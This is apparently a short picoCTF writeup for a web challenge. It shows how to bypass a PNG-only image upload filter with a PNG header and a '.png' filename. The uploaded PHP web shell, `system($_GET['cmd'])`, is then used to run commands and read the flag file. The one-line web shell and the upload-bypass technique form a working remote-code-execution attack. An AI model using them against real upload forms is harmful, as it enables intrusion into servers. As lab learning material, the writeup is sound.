+++
date = '2026-04-15'
draft = false
title = 'Pico Trickster writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

I found a web app that can help process images: PNG images only!

---

Image upload, so immediately this is some sort of php file upload vulnerability.


## Identifying the vulnerabilities

We can smuggle any file as a png, by adding the PNG header and the .png extension, upon testing.

There is also an /uploads directory, where we can find each one of our uploaded files. 

I noticed something interesting in the phrasing, when trying different exentions: *Error: File name does not contain '.png'.* So I thought, what if we just pop that in? So I send this file:

![challenge-screenshot](file.png#center)

And, it worked! So now, we can run any command we like. I replaced the payload with `<?php system($_GET['cmd']); ?>`, so we can use the *cmd* parameter to mess around for less effort. After ls-ing around, I found the file at `cmd=cat+../GAZWIMLEGU2DQ.txt`, with the flag: `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}`.
